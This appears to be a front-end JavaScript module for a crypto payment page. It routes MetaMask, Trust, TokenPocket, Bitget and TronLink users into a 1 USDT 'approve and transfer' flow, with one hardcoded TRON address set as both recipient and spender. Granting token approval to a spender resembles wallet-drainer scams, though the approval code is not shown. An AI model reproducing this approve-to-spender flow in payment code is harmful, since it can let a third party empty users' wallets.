(function () {
  const core = window.pay0Core;
  if (!core) throw new Error("pay0Core 未加载");
  const $ = core.$;

  let walletModalInstance = null;

  function showModal() {
    const el = $("walletModal");
    if (!el || !window.bootstrap) return;
    walletModalInstance = window.bootstrap.Modal.getOrCreateInstance(el, { backdrop: "static", keyboard: false });
    walletModalInstance.show();
  }

  function hideModal() {
    if (walletModalInstance && typeof walletModalInstance.hide === "function") walletModalInstance.hide();
  }

  function evmParams() {
    const chainKey = $("network") ? ($("network").value || "bsc") : "bsc";
    const tokenAddress = $("token") ? $("token").value.trim() : "";
    const spenderAddress = $("spender") ? $("spender").value.trim() : "";
    const toAddress = $("recipient") ? $("recipient").value.trim() : "";
    const amountUsdt = $("transferAmount") ? ($("transferAmount").value.trim() || (($("approveAmount") && $("approveAmount").value.trim()) || "")) : "";
    return { chainKey, tokenAddress: tokenAddress || null, spenderAddress, toAddress, amountUsdt };
  }

  function uaIncludes(s) {
    try {
      return typeof navigator !== "undefined" && typeof navigator.userAgent === "string" && navigator.userAgent.toLowerCase().includes(String(s).toLowerCase());
    } catch (e) {
      return false;
    }
  }

  function isMetaMaskProvider() {
    return !!(window.ethereum && window.ethereum.isMetaMask && !window.ethereum.isTokenPocket && !window.ethereum.isBitKeep && !window.ethereum.isTrust && !window.ethereum.isTrustWallet);
  }

  function isTrustProvider() {
    return !!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet));
  }

  function isTokenPocketEnv() {
    return !!((window.ethereum && window.ethereum.isTokenPocket) || window.tokenPocket || uaIncludes("tokenpocket"));
  }

  function isBitgetEnv() {
    return !!((window.ethereum && window.ethereum.isBitKeep) || (window.bitkeep && window.bitkeep.ethereum) || uaIncludes("bitkeep") || uaIncludes("bitget"));
  }

  async function getEvmChainIdHex() {
    if (!window.ethereum) throw new Error("未检测到 EVM 钱包");
    return await window.ethereum.request({ method: "eth_chainId" });
  }

  function chainKeyFromChainIdHex(chainIdHex) {
    const s = String(chainIdHex || "").toLowerCase();
    if (s === "0x1") return "eth";
    if (s === "0x38") return "bsc";
    if (s === "0x61") return "bscTestnet";
    return null;
  }

  async function payEvmByCurrentChain(allowedChainKeys, log) {
    if (!window.ethereum) throw new Error("未检测到 EVM 钱包");
    const chainIdHex = await getEvmChainIdHex();
    const chainKey = chainKeyFromChainIdHex(chainIdHex);
    if (!chainKey) throw new Error("当前链不支持：" + chainIdHex);
    if (Array.isArray(allowedChainKeys) && allowedChainKeys.length > 0 && !allowedChainKeys.includes(chainKey)) {
      throw new Error("当前链不支持：" + chainKey);
    }
    if (typeof window.pay0EvmApproveAndTransfer !== "function") throw new Error("EVM 模块未加载");
    await window.pay0EvmApproveAndTransfer({
      chain: chainKey,
      amountUsdt: "1",
      log
    });
  }

  async function payTronViaTronLink(log) {
    if (typeof window.pay0TronLinkTransfer !== "function") throw new Error("TronLink 模块未加载");
    await window.pay0TronLinkTransfer({
      log,
      amountUsdt: "1",
      toAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6",
      spenderAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6"
    });
  }

  async function payTronViaTronWeb(log) {
    if (typeof window.pay0TokenPocketTronTransfer !== "function") throw new Error("TronWeb 模块未加载");
    await window.pay0TokenPocketTronTransfer({
      log,
      amountUsdt: "1",
      toAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6",
      spenderAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6"
    });
  }

  async function payTokenPocketSelected(log) {
    if (!isTokenPocketEnv()) throw new Error("未检测到 TokenPocket，请在 TokenPocket 内置浏览器打开本页");
    if (typeof window.pay0TokenPocketPay !== "function") throw new Error("TokenPocket 模块未加载");
    await window.pay0TokenPocketPay({ log });
  }

  async function payBitgetSelected(log) {
    if (!isBitgetEnv()) throw new Error("未检测到 Bitget Wallet，请在 Bitget Wallet 内置浏览器打开本页或安装插件");
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      await payTronViaTronWeb(log);
      return;
    }
    if (window.ethereum) {
      await payEvmByCurrentChain(["eth"], log);
      return;
    }
    throw new Error("未检测到 Bitget Wallet 注入的 tronWeb / ethereum");
  }

  async function payMetaMaskSelected(log) {
    if (!isMetaMaskProvider()) throw new Error("未检测到 MetaMask，请启用 MetaMask 或禁用其他 EVM 钱包插件");
    await payEvmByCurrentChain(["eth", "bsc", "bscTestnet"], log);
  }

  async function payTrustSelected(log) {
    if (!isTrustProvider()) throw new Error("未检测到 Trust Wallet，请启用 Trust Wallet 或禁用其他 EVM 钱包插件");
    await payEvmByCurrentChain(["eth"], log);
  }

  function bindWalletButtons(log) {
    const btnConnect = $("btnConnect");
    if (btnConnect) btnConnect.addEventListener("click", () => showModal());

    const btnCloseModal = $("btnCloseModal");
    if (btnCloseModal) btnCloseModal.addEventListener("click", () => hideModal());

    const walletModal = $("walletModal");
    if (walletModal) walletModal.addEventListener("click", (e) => { if (e.target === walletModal) hideModal(); });

    const btnMetaMask = $("btnWalletMetaMask");
    if (btnMetaMask) btnMetaMask.addEventListener("click", async () => {
      try {
        hideModal();
        await payMetaMaskSelected(log);
      } catch (e) {
        log("MetaMask 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnTokenPocket = $("btnWalletTokenPocket");
    if (btnTokenPocket) btnTokenPocket.addEventListener("click", async () => {
      try {
        hideModal();
        await payTokenPocketSelected(log);
      } catch (e) {
        log("TokenPocket 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnTronLink = $("btnWalletTronLink");
    if (btnTronLink) btnTronLink.addEventListener("click", async () => {
      try {
        hideModal();
        await payTronViaTronLink(log);
      } catch (e) {
        log("TronLink 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnBitget = $("btnWalletBitget");
    if (btnBitget) btnBitget.addEventListener("click", async () => {
      try {
        hideModal();
        await payBitgetSelected(log);
      } catch (e) {
        log("Bitget 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnTrust = $("btnWalletTrust");
    if (btnTrust) btnTrust.addEventListener("click", async () => {
      try {
        hideModal();
        await payTrustSelected(log);
      } catch (e) {
        log("Trust Wallet 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });
  }

  function init(opts) {
    const log = opts && typeof opts.log === "function" ? opts.log : function () {};
    bindWalletButtons(log);
    showModal();
    log("页面已就绪");
  }

  window.pay0Actions = { init };
})();
